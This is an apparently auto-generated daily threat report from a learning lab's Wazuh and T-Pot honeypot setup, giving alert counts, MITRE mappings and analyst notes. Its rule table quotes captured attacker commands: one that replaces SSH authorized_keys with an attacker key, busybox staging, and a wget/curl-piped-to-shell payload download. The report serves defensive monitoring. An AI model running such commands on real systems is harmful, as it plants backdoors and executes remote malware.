# LearningLab01 Daily Threat Intelligence Report — 2026-10-21

Generated: 2026-10-21T13:15:05.053Z

Report window: 2026-10-20T13:15:05.029Z through 2026-10-21T13:15:05.029Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 360,860 |
| Attack-related alerts | 15,127 |
| Honeypot interactions | 352,953 |
| Authentication failures | 1,718 |
| Authentication successes | 607 |
| Critical alerts | 238 |
| High alerts | 645 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 238 critical-severity alerts require priority review.
- 645 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 2.83:1.
- Country attribution currently covers only 0.19% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (290,931 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 238 | 0.07% |
| High | 645 | 0.18% |
| Medium | 2,889 | 0.80% |
| Low | 357,088 | 98.95% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 1,718
- Authentication successes: 607
- Failure-to-success ratio: 2.83:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 9,974 | 65.94% |
| Payload delivery | 9,974 | 65.94% |
| Command execution | 2,107 | 13.93% |
| Authentication failure | 1,718 | 11.36% |
| Reconnaissance | 670 | 4.43% |
| Network scan | 285 | 1.88% |
| Malware | 234 | 1.55% |
| SMTP attack | 147 | 0.97% |
| Web attack | 55 | 0.36% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 691 alerts, representing 0.19% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 360,169 | 99.81% | Not geolocated |
| Germany | 278 | 0.08% | ████████████████████ |
| United Kingdom | 204 | 0.06% | ███████████████ |
| Bulgaria | 128 | 0.04% | █████████ |
| United States | 64 | 0.02% | █████ |
| Romania | 6 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Hungary | 2 | 0.00% | █ |
| Panama | 2 | 0.00% | █ |
| Iran | 1 | 0.00% | █ |
| Switzerland | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 292 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Execution | 90 |
| Credential Access | 33 |
| Impact | 11 |
| Command and Control | 3 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 90 |
| Brute Force | 33 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 3 |
| Disable or Modify Tools | 1 |
| Exploit Public-Facing Application | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 290,931 | T-Pot RDP connection from [IP address] to port 3389. | tpot (290,931) |
| 110207 | 5 | 26,489 | T-Pot SentryPeer SIP activity from [IP address]:56444, method INVITE | tpot (26,489) |
| 110204 | 4 | 21,467 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (21,467) |
| 110205 | 6 | 9,911 | T-Pot Honeytrap received a payload from [IP address] | tpot (9,911) |
| 110101 | 3 | 2,785 | Cowrie SSH connection from [IP address]. | tpot (2,785) |
| 110209 | 5 | 2,098 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (2,098) |
| 110104 | 7 | 1,779 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (1,779) |
| 110102 | 5 | 1,718 | Cowrie failed login from [IP address] using username post. | tpot (1,718) |
| 110201 | 4 | 539 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (539) |
| 110219 | 4 | 372 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/ HTTP/1.1" 404 - | tpot (372) |
| 110103 | 10 | 316 | Cowrie accepted login from [IP address] using username root. | tpot (316) |
| 110214 | 9 | 284 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (284) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 110109 | 13 | 237 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (237) |
| 110216 | 4 | 215 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (215) |
| 110221 | 7 | 211 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (211) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 177 | PAM: Login session closed. | tpot (176), wazuh (1) |
| 110217 | 7 | 147 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (147) |
| 110105 | 12 | 142 | Cowrie captured a file download from [IP address]. | tpot (142) |
| 110220 | 8 | 111 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (111) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110108 | 12 | 89 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x51\x58\x4d\x58\x57' | tpot (89) |
| 110212 | 10 | 63 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (63) |
| 110223 | 5 | 51 | T-Pot HoneyAML received  request from  to  on port . | tpot (51) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110106 | 10 | 33 | Cowrie detected repeated failed logins from [IP address]. | tpot (33) |
| 110215 | 4 | 30 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (30) |
| 110208 | 7 | 26 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:38379 | tpot (26) |
| 203 | 9 | 11 | Agent event queue is full. Events may be lost. | tpot (11) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 202 | 7 | 10 | Agent event queue is 90% full. | tpot (10) |
| 205 | 3 | 10 | Agent event queue is back to normal load. | tpot (10) |
| 2904 | 7 | 6 | Dpkg (Debian Package) half configured. | tpot (6) |
| 110224 | 7 | 4 | T-Pot HoneyAML received an HTTP POST from [IP address] to /. | tpot (4) |
| 2902 | 7 | 3 | New dpkg (Debian Package) installed. | tpot (3) |
| 110107 | 12 | 2 | Cowrie captured a probable payload-retrieval command from [IP address]: UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e "\x72\x65\x64\x74\x61\x69\x6C\x5F\x62\x6F\x74\x5F\x74\x65\x6C\x6E\x65\x74\x5F\x6F\x6B" | tpot (2) |
| 110211 | 9 | 1 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (1) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110222 | 9 | 1 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (1) |
| 110225 | 13 | 1 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (1) |
| 19004 | 7 | 1 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
